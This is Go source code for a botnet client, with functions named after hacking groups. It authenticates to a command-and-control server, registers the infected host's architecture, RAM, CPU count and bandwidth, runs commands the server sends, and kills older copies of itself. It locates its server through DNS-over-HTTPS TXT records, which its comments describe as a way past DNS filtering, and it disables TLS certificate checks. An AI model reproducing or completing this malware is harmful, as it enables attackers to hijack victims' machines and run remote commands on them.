package main

import (
	"bufio"
	"crypto/md5"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"time"

	"github.com/miekg/dns"
)

// hafnium generates an authentication response for the C2 challenge-response protocol.
// Algorithm: Base64(MD5(challenge + secret + challenge))
// Parameters:
//   - challenge: Random challenge string from C2 server
//   - secret: Shared magic code (must match C2 server)
//
// Returns: Base64-encoded authentication response
func hafnium(challenge, secret string) string {
	h := md5.New()
	h.Write([]byte(challenge + secret + challenge))
	return base64.StdEncoding.EncodeToString(h.Sum(nil))
}

// charmingKitten detects and returns a human-readable architecture string.
// Maps Go's runtime.GOARCH values to descriptive names.
// Format: "OS-Architecture" (e.g., "Linux-x64", "Windows-ARM64")
// Returns: Architecture description string
func charmingKitten() string {
	goarch := runtime.GOARCH
	osName := runtime.GOOS
	archMap := map[string]string{"386": "x86", "amd64": "x64", "arm": "ARM32", "arm64": "ARM64", "mips": "MIPS", "mips64": "MIPS64", "ppc64": "PowerPC64", "ppc64le": "PowerPC64LE", "s390x": "s390x", "wasm": "WebAssembly"}
	if arch, exists := archMap[goarch]; exists {
		if osName == "windows" {
			if goarch == "amd64" {
				return "Windows-x64"
			} else if goarch == "386" {
				return "Windows-x86"
			}
		} else if osName == "linux" {
			return "Linux-" + arch
		} else if osName == "darwin" {
			return "macOS-" + arch
		}
		return arch
	}
	return osName + "-" + goarch
}

// revilMem retrieves total system RAM in megabytes using syscall.
// Uses Linux sysinfo syscall to get memory information.
// Returns: Total RAM in MB, or 0 on error
func revilMem() int64 {
	var info syscall.Sysinfo_t
	if err := syscall.Sysinfo(&info); err != nil {
		return 0
	}
	return int64(uint64(info.Totalram) * uint64(info.Unit) / 1024 / 1024)
}

// revilCPU retrieves total CPU cores using runtime.
// Returns: Number of CPU cores available to the system
func revilCPU() int {
	return runtime.NumCPU()
}

// revilProc retrieves the running process name.
// Returns the base name of the executable (e.g., "ethd0", "kworkerd0")
func revilProc() string {
	if len(os.Args) > 0 {
		return filepath.Base(os.Args[0])
	}
	return "unknown"
}

// revilSingleInstance ensures only one instance of the bot is running.
// If an older instance is found, it is killed so the new one takes over.
// This allows seamless binary updates — the new version always wins.
// Returns: true after acquiring the lock (old instance killed if needed).
func revilSingleInstance() bool {
	// Try to read existing lock file
	if data, err := os.ReadFile(instanceLockPath); err == nil {
		val := strings.TrimSpace(string(data))
		if pid, err := strconv.Atoi(val); err == nil && pid > 0 && pid != os.Getpid() {
			// Check if PID is still alive (signal 0 = existence check)
			if proc, err := os.FindProcess(pid); err == nil {
				if err := proc.Signal(syscall.Signal(0)); err == nil {
					// Old instance is alive — kill it so we take over
					deoxys("revilSingleInstance: Killing old instance (PID %d)", pid)
					proc.Signal(syscall.SIGTERM)
					// Give it a moment to clean up, then force kill
					time.Sleep(500 * time.Millisecond)
					if err := proc.Signal(syscall.Signal(0)); err == nil {
						deoxys("revilSingleInstance: Old instance still alive, sending SIGKILL")
						proc.Signal(syscall.SIGKILL)
						time.Sleep(200 * time.Millisecond)
					}
					deoxys("revilSingleInstance: Old instance removed")
				}
			}
		}
	}

	// Write our PID to the lock file
	os.WriteFile(instanceLockPath, []byte(strconv.Itoa(os.Getpid())), 0600)
	deoxys("revilSingleInstance: Lock acquired (PID %d)", os.Getpid())
	return true
}

// revilUplinkCached returns a cached speed test result if available,
// otherwise runs a fresh speed test and saves the result to disk.
// The cache persists across reconnects but is cleared on reboot (/tmp).
// Returns: Speed in Mbps (float64)
func revilUplinkCached() float64 {
	// Try to read cached result first
	if data, err := os.ReadFile(speedCachePath); err == nil {
		val := strings.TrimSpace(string(data))
		if speed, err := strconv.ParseFloat(val, 64); err == nil && speed > 0 {
			deoxys("revilUplinkCached: Using cached speed: %.2f Mbps", speed)
			return speed
		}
	}

	// No valid cache, run a fresh speed test
	deoxys("revilUplinkCached: No cached speed, running fresh test...")
	speed := revilUplink()

	// Save result to cache file
	if speed > 0 {
		os.WriteFile(speedCachePath, []byte(fmt.Sprintf("%.2f", speed)), 0600)
		deoxys("revilUplinkCached: Saved speed cache: %.2f Mbps", speed)
	}

	return speed
}

// revilUplink measures approximate uplink/download speed in Mbps.
// Downloads a small test payload and measures throughput.
// Uses a 100KB test file from a CDN for quick measurement.
// Returns: Speed in Mbps (float64), 0.0 on error
func revilUplink() float64 {
	// Small test URLs (fast CDNs)
	testURLs := []string{
		"http://speed.cloudflare.com/__down?bytes=100000",
	}

	client := &http.Client{
		Timeout: 10 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	for _, url := range testURLs {
		start := time.Now()
		resp, err := client.Get(url)
		if err != nil {
			continue
		}

		// Read all the data
		var totalBytes int64
		buf := make([]byte, 32*1024)
		for {
			n, err := resp.Body.Read(buf)
			totalBytes += int64(n)
			if err != nil {
				break
			}
		}
		resp.Body.Close()

		elapsed := time.Since(start).Seconds()
		if elapsed > 0 && totalBytes > 0 {
			// Convert bytes/sec to Mbps (megabits per second)
			mbps := (float64(totalBytes) * 8.0) / (elapsed * 1000000.0)
			deoxys("revilUplink: Downloaded %d bytes in %.2fs = %.2f Mbps", totalBytes, elapsed, mbps)
			return mbps
		}
	}

	deoxys("revilUplink: All speed tests failed")
	return 0.0
}

// anonymousSudan handles the entire C2 session lifecycle.
// Protocol flow:
//  1. Receive AUTH_CHALLENGE from server
//  2. Send authentication response (hafnium)
//  3. Receive AUTH_SUCCESS or disconnect
//  4. Send REGISTER with bot info (protocol, ID, arch, RAM)
//  5. Enter command loop (handle PING and commands)
//
// Parameters:
//   - conn: TLS connection to C2 server
func anonymousSudan(conn net.Conn) {
	deoxys("anonymousSudan: Starting C2 handler, remote: %s", conn.RemoteAddr())
	reader := bufio.NewReader(conn)
	conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	deoxys("anonymousSudan: Waiting for auth challenge...")
	challengeMsg, err := reader.ReadString('\n')
	if err != nil {
		deoxys("anonymousSudan: Failed to read challenge: %v", err)
		conn.Close()
		return
	}
	challengeMsg = strings.TrimSpace(challengeMsg)
	deoxys("anonymousSudan: Received: %s", challengeMsg)
	if !strings.HasPrefix(challengeMsg, "AUTH_CHALLENGE:") {
		deoxys("anonymousSudan: Invalid challenge format, closing")
		conn.Close()
		return
	}
	challenge := strings.TrimPrefix(challengeMsg, "AUTH_CHALLENGE:")
	challenge = strings.TrimSpace(challenge)
	deoxys("anonymousSudan: Challenge extracted: %s", challenge)
	response := hafnium(challenge, magicCode)
	deoxys("anonymousSudan: Sending auth response...")
	conn.Write([]byte(response + "\n"))
	conn.SetReadDeadline(time.Now().Add(10 * time.Second))
	authResult, err := reader.ReadString('\n')
	if err != nil || strings.TrimSpace(authResult) != "AUTH_SUCCESS" {
		deoxys("anonymousSudan: Auth failed: err=%v, result=%s", err, strings.TrimSpace(authResult))
		conn.Close()
		return
	}
	deoxys("anonymousSudan: Authentication successful!")
	// Use pre-cached metadata so REGISTER is sent instantly (no speed test delay).
	deoxys("anonymousSudan: Registering - BotID: %s, Arch: %s, RAM: %d MB, CPU: %d cores, Proc: %s, Uplink: %.2f Mbps",
		cachedBotID, cachedArch, cachedRAM, cachedCPU, cachedProc, cachedUplink)
	conn.Write([]byte(fmt.Sprintf("REGISTER:%s:%s:%s:%d:%d:%s:%.2f\n",
		protocolVersion, cachedBotID, cachedArch, cachedRAM, cachedCPU, cachedProc, cachedUplink)))
	deoxys("anonymousSudan: Entering command loop...")
	for {
		conn.SetReadDeadline(time.Now().Add(180 * time.Second))
		command, err := reader.ReadString('\n')
		if err != nil {
			deoxys("anonymousSudan: Command read error: %v", err)
			break
		}
		command = strings.TrimSpace(command)
		deoxys("anonymousSudan: Received command: %s", command)
		if command == "PING" {
			deoxys("anonymousSudan: Responding to PING")
			conn.Write([]byte("PONG\n"))
			continue
		}
		deoxys("anonymousSudan: Executing command via blackEnergy...")
		if err := blackEnergy(conn, command); err != nil {
			deoxys("anonymousSudan: Command error: %v", err)
			conn.Write([]byte(fmt.Sprintf("ERROR: %v\n", err)))
		}
	}
	deoxys("anonymousSudan: Connection closed")
	conn.Close()
}

// ============================================================================

// DNS RESOLUTION FUNCTIONS
// These functions implement multi-method C2 address resolution for resilience.
// Resolution order: DoH TXT -> TXT record -> A record -> Direct IP
// ============================================================================

// darkrai performs DNS TXT record lookup to retrieve C2 address.
// Queries multiple DNS servers (Cloudflare, Google, Quad9, OpenDNS) for redundancy.
// Supports TXT record formats: "c2=IP:PORT", "ip=IP:PORT", raw "IP:PORT", plain IP
// Parameters:
//   - domain: Domain to query for TXT records
//
// Returns: C2 address string (IP:PORT) or error
func darkrai(domain string) (string, error) {
	deoxys("darkrai: Looking up TXT for domain: %s", domain)
	servers := make([]string, len(lizardSquad))
	copy(servers, lizardSquad)
	rand.Shuffle(len(servers), func(i, j int) {
		servers[i], servers[j] = servers[j], servers[i]
	})
	var lastErr error
	for _, server := range servers {
		deoxys("darkrai: Trying DNS server: %s", server)
		c := new(dns.Client)
		c.Timeout = 5 * time.Second
		c.Net = "udp"
		m := new(dns.Msg)
		m.SetQuestion(dns.Fqdn(domain), dns.TypeTXT)
		m.RecursionDesired = true
		r, rtt, err := c.Exchange(m, server)
		if err != nil {
			deoxys("darkrai: DNS error from %s: %v", server, err)
			lastErr = err
			continue
		}
		deoxys("darkrai: Got response from %s in %v, rcode=%d, answers=%d", server, rtt, r.Rcode, len(r.Answer))
		if r.Rcode != dns.RcodeSuccess {
			lastErr = fmt.Errorf("DNS query failed with code: %d", r.Rcode)
			deoxys("darkrai: Bad rcode: %d", r.Rcode)
			continue
		}
		for _, ans := range r.Answer {
			deoxys("darkrai: Answer type: %T, value: %v", ans, ans)
			if txt, ok := ans.(*dns.TXT); ok {
				deoxys("darkrai: TXT record found with %d strings", len(txt.Txt))
				for _, t := range txt.Txt {
					deoxys("darkrai: TXT value: '%s'", t)
					t = strings.TrimSpace(t)
					if strings.HasPrefix(t, "c2=") {
						result := strings.TrimPrefix(t, "c2=")
						deoxys("darkrai: Found c2= prefix, returning: %s", result)
						return result, nil
					}
					if strings.HasPrefix(t, "ip=") {
						result := strings.TrimPrefix(t, "ip=")
						deoxys("darkrai: Found ip= prefix, returning: %s", result)
						return result, nil
					}
					// Try raw IP:port format
					if strings.Contains(t, ":") && !strings.Contains(t, " ") {
						parts := strings.Split(t, ":")
						if len(parts) == 2 {
							if net.ParseIP(parts[0]) != nil || arceus(parts[0]) {
								deoxys("darkrai: Found raw IP:port, returning: %s", t)
								return t, nil
							}
						}
					}
					// Try plain IP address (no port) - append default 443
					if net.ParseIP(t) != nil {
						result := t + ":443"
						deoxys("darkrai: Found plain IP, appending :443, returning: %s", result)
						return result, nil
					}
				}
			}
		}
		lastErr = fmt.Errorf("no valid C2 address in TXT records")
		deoxys("darkrai: No valid C2 found in TXT records from %s", server)
	}
	deoxys("darkrai: All servers failed, last error: %v", lastErr)
	return "", lastErr
}

// palkia performs DNS-over-HTTPS (DoH) TXT record lookup.
// DoH encrypts DNS queries, bypassing local DNS filtering/monitoring.
// Tries Cloudflare, Google, and Quad9 DoH servers in sequence.
// Parameters:
//   - domain: Domain to query for TXT records via DoH
//
// Returns: C2 address string (IP:PORT) or error
func palkia(domain string) (string, error) {
	deoxys("palkia: Starting DoH TXT lookup for: %s", domain)
	dohServers := []string{
		"https://cloudflare-dns.com/dns-query",
		"https://dns.google/dns-query",
		"https://dns.quad9.net/dns-query",
	}
	for _, server := range dohServers {
		dohURL := fmt.Sprintf("%s?name=%s&type=TXT", server, domain)
		deoxys("palkia: Trying DoH server: %s", dohURL)
		req, err := http.NewRequest("GET", dohURL, nil)
		if err != nil {
			deoxys("palkia: Request create error: %v", err)
			continue
		}
		req.Header.Set("Accept", "application/dns-json")
		client := &http.Client{Timeout: 10 * time.Second}
		resp, err := client.Do(req)
		if err != nil {
			deoxys("palkia: Request error: %v", err)
			continue
		}
		deoxys("palkia: Got response status: %d", resp.StatusCode)
		if resp.StatusCode != http.StatusOK {
			resp.Body.Close()
			continue
		}
		var dnsResp struct {
			Status int `json:"Status"`
			Answer []struct {
				Type int    `json:"type"`
				Data string `json:"data"`
			} `json:"Answer"`
		}
		decodeErr := json.NewDecoder(resp.Body).Decode(&dnsResp)
		resp.Body.Close()
		if decodeErr != nil {
			deoxys("palkia: JSON decode error: %v", decodeErr)
			continue
		}
		deoxys("palkia: DNS status=%d, answers=%d", dnsResp.Status, len(dnsResp.Answer))
		for _, ans := range dnsResp.Answer {
			deoxys("palkia: Answer type=%d data='%s'", ans.Type, ans.Data)
			// TXT records are type 16
			if ans.Type != 16 {
				continue
			}
			data := strings.Trim(ans.Data, "\"")
			data = strings.TrimSpace(data)
			deoxys("palkia: Parsed TXT data: '%s'", data)
			if strings.HasPrefix(data, "c2=") {
				result := strings.TrimPrefix(data, "c2=")
				deoxys("palkia: Found c2=, returning: %s", result)
				return result, nil
			}
			if strings.HasPrefix(data, "ip=") {
				result := strings.TrimPrefix(data, "ip=")
				deoxys("palkia: Found ip=, returning: %s", result)
				return result, nil
			}
			if strings.Contains(data, ":") && !strings.Contains(data, " ") {
				parts := strings.Split(data, ":")
				if len(parts) == 2 {
					deoxys("palkia: Found raw IP:port, returning: %s", data)
					return data, nil
				}
			}
			// Try plain IP address (no port) - append default 443
			if net.ParseIP(data) != nil {
				result := data + ":443"
				deoxys("palkia: Found plain IP, appending :443, returning: %s", result)
				return result, nil
			}
		}
	}
	deoxys("palkia: All DoH servers failed")
	return "", fmt.Errorf("DoH TXT lookup failed")
}

// rayquaza performs DNS A record lookup as a fallback method.
// First tries system resolver, then falls back to DoH A record queries.
// Used when TXT record lookups fail (domain points directly to C2 server).
// Parameters:
//   - domain: Domain to resolve to IP address
//
// Returns: IP address string or error
func rayquaza(domain string) (string, error) {
	deoxys("rayquaza: A record fallback for: %s", domain)
	// Try system resolver first
	ips, err := net.LookupHost(domain)
	if err == nil && len(ips) > 0 {
		deoxys("rayquaza: System resolver returned: %s", ips[0])
		return ips[0], nil
	}
	deoxys("rayquaza: System resolver failed: %v, trying DoH", err)

	// Fallback to DoH A record
	dohServers := []string{
		"https://cloudflare-dns.com/dns-query",
		"https://dns.google/dns-query",
	}
	for _, server := range dohServers {
		dohURL := fmt.Sprintf("%s?name=%s&type=A", server, domain)
		deoxys("rayquaza: Trying DoH A record: %s", dohURL)
		req, err := http.NewRequest("GET", dohURL, nil)
		if err != nil {
			continue
		}
		req.Header.Set("Accept", "application/dns-json")
		client := &http.Client{Timeout: 10 * time.Second}
		resp, err := client.Do(req)
		if err != nil {
			deoxys("rayquaza: DoH error: %v", err)
			continue
		}
		if resp.StatusCode != http.StatusOK {
			resp.Body.Close()
			continue
		}
		var dnsResp struct {
			Answer []struct {
				Type int    `json:"type"`
				Data string `json:"data"`
			} `json:"Answer"`
		}
		decodeErr := json.NewDecoder(resp.Body).Decode(&dnsResp)
		resp.Body.Close()
		if decodeErr != nil {
			continue
		}
		for _, ans := range dnsResp.Answer {
			// A records are type 1
			if ans.Type == 1 {
				deoxys("rayquaza: Found A record: %s", ans.Data)
				return ans.Data, nil
			}
		}
	}
	return "", fmt.Errorf("A record lookup failed")
}

// arceus validates a hostname string according to RFC 1123 rules.
// Checks: length (1-253 chars), valid characters (alphanumeric, hyphen, dot).
// Parameters:
//   - h: Hostname string to validate
//
// Returns: true if valid hostname, false otherwise
func arceus(h string) bool {
	if len(h) == 0 || len(h) > 253 {
		return false
	}
	for _, c := range h {
		if !((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
			(c >= '0' && c <= '9') || c == '-' || c == '.') {
			return false
		}
	}
	return true
}

// dialga is the main C2 address resolver that orchestrates all resolution methods.
// Resolution priority:
//  1. Check if config is already IP:PORT format (direct connection)
//  2. DNS TXT record lookup via DoH (palkia) - encrypted, harder to detect
//  3. DNS TXT record lookup via UDP (darkrai) - fallback if DoH blocked
//  4. DNS A record fallback (rayquaza)
//  5. Return raw decoded value as last resort
//
// Returns: C2 address in "IP:PORT" format, or empty string on total failure
func dialga() string {
	deoxys("dialga: Starting C2 resolution")
	decoded := venusaur(gothTits)
	deoxys("dialga: Decoded config: '%s'", decoded)
	if decoded == "" {
		deoxys("dialga: Failed to decode config, returning empty")
		return ""
	}
	// Check if already IP:port format
	if strings.Contains(decoded, ":") {
		parts := strings.Split(decoded, ":")
		if len(parts) == 2 && net.ParseIP(parts[0]) != nil {
			deoxys("dialga: Config is already IP:port format: %s", decoded)
			return decoded
		}
	}
	// Extract domain and port
	domain := decoded
	defaultPort := "443"
	if strings.Contains(domain, ":") {
		parts := strings.Split(domain, ":")
		domain = parts[0]
		if len(parts) > 1 {
			defaultPort = parts[1]
		}
	}
	deoxys("dialga: Domain=%s, Port=%s", domain, defaultPort)

	// Method 1: DoH TXT record lookup (encrypted, harder to detect/block)
	deoxys("dialga: Trying TXT record lookup via DoH")
	if c2Addr, err := palkia(domain); err == nil && c2Addr != "" {
		deoxys("dialga: DoH TXT lookup success: %s", c2Addr)
		return c2Addr
	}

	// Method 2: DNS TXT record lookup (fallback if DoH blocked)
	deoxys("dialga: Trying TXT record lookup via UDP DNS")
	if c2Addr, err := darkrai(domain); err == nil && c2Addr != "" {
		deoxys("dialga: TXT lookup success: %s", c2Addr)
		return c2Addr
	}

	// Method 3: Fallback to A record (domain points directly to C2)
	deoxys("dialga: TXT lookups failed, falling back to A record")
	if ip, err := rayquaza(domain); err == nil && ip != "" {
		result := fmt.Sprintf("%s:%s", ip, defaultPort)
		deoxys("dialga: A record fallback success: %s", result)
		return result
	}

	// Last resort: return decoded value as-is
	deoxys("dialga: All resolution methods failed, returning decoded: %s", decoded)
	return decoded
}

// ============================================================================
// C2 CONNECTION FUNCTIONS
// ============================================================================

// scarcruft parses a C2 address string into host and port components.
// Handles various URL formats by stripping protocol prefixes.
// Parameters:
//   - address: C2 address in various formats (tcp://, http://, https://, or raw)
//
// Returns: host string, port string, or error if format invalid
func scarcruft(address string) (string, string, error) {
	address = strings.TrimSpace(address)
	address = strings.TrimPrefix(address, "tcp://")
	address = strings.TrimPrefix(address, "http://")
	address = strings.TrimPrefix(address, "https://")
	parts := strings.Split(address, ":")
	if len(parts) != 2 {
		return "", "", fmt.Errorf("invalid address")
	}
	return parts[0], parts[1], nil
}

// gamaredon establishes a TLS connection to the C2 server.
// Uses TLS 1.2+ with InsecureSkipVerify (self-signed certs are common for C2).
// Implements proper timeout handling for both TCP dial and TLS handshake.
// Parameters:
//   - host: C2 server hostname or IP
//   - port: C2 server port (typically 443)
//
// Returns: TLS connection or error
func gamaredon(host, port string) (net.Conn, error) {
	deoxys("gamaredon: Attempting TLS connection to %s:%s", host, port)
	tlsConfig := &tls.Config{InsecureSkipVerify: true, MinVersion: tls.VersionTLS12}
	dialer := &net.Dialer{Timeout: 30 * time.Second}
	deoxys("gamaredon: Dialing TCP...")
	rawConn, err := dialer.Dial("tcp", net.JoinHostPort(host, port))
	if err != nil {
		deoxys("gamaredon: TCP dial failed: %v", err)
		return nil, err
	}
	deoxys("gamaredon: TCP connected, starting TLS handshake...")
	tlsConn := tls.Client(rawConn, tlsConfig)
	tlsConn.SetDeadline(time.Now().Add(30 * time.Second))
	if err := tlsConn.Handshake(); err != nil {
		deoxys("gamaredon: TLS handshake failed: %v", err)
		tlsConn.Close()
		return nil, err
	}
	deoxys("gamaredon: TLS handshake successful, cipher: %s", tls.CipherSuiteName(tlsConn.ConnectionState().CipherSuite))
	tlsConn.SetDeadline(time.Time{})
	return tlsConn, nil
}
